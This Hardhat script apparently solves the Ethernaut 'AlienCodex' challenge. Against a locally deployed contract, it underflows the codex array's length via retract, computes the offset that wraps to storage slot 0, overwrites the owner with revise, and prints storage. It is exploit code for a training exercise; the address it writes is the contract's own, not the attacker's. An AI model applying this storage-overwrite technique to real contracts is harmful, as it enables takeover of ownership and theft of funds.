const { network, deployments, ethers, getNamedAccounts } = require('hardhat')

async function main() {
    const [owner, addr1, addr2] = await ethers.getSigners()

    const AlienCodex = await ethers.getContractFactory('AlienCodex')
    const alienCodex = await AlienCodex.deploy()
    await alienCodex.deployed()

    const hacker = await alienCodex.connect(addr1)

    // ------------ let's hack -------------

    await hacker.make_contact()
    await hacker.retract()

    const codexBegin = ethers.BigNumber.from(ethers.utils.keccak256(`0x0000000000000000000000000000000000000000000000000000000000000001`))
    const ownerOffset = ethers.BigNumber.from('2').pow('256').sub(codexBegin)
    await hacker.revise(ownerOffset, ethers.utils.zeroPad(hacker.address, 32))
    await memory(owner, alienCodex)
}

async function memory(owner, alienCodex) {
    console.log('----------------------------')
    for (let i = 0; i < 10; i++) {
        let temp = await owner.provider.getStorageAt(alienCodex.address, i)
        console.log(`slot ${i} : ${temp}`)
    }
}

// hh run scripts/ethernaut1.js --network hardhat
main()
    .then(() => process.exit(0))
    .catch((error) => {
        console.error(error)
        process.exit(1)
    })
